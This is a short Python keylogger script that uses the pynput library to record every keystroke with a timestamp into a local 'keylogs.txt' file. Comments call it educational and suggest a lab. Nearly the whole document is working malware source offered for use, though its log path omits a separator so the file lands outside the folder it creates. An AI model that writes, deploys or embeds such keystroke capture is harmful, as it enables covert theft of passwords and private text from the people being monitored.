#This is for educational purposes only
import os
import pynput
from pynput.keyboard import Key, Listener
import logging


#Specifies the path for the directory
path = './YourPath'

#ensuring the path doesn't already exist
try:
    os.mkdir(path) 
except FileExistsError:
    print("Folder %s already exists" % path)

log_dir = r"./YourPath"

#Creating your file name, and logging keys in the created "keylogs.txt" file
logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
        level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

#Again this is for educational purposes only, try this in a secure lab environment if you please. This is one of many attack vectors malicious actors can use. Be safe
